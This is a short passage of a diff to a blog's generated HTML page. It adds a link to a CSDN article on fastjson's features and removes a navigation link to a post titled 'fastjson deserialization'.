+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39555624/article/details/117820779%EF%BC%88%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E4%B8%BB%E8%A6%81%E6%98%AFfastjson%E7%9A%84%E7%89%B9%E6%80%A7%EF%BC%89">https://blog.csdn.net/weixin_39555624/article/details/117820779（这篇文章主要是fastjson的特性）</a></p>
 
                 
               </div>
@@ -376,23 +576,6 @@
 
 
 
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2025/03/25/fastjson/" title="fastjson反序列化">
-                        <span class="hidden-mobile">fastjson反序列化</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
               
             </div>
 
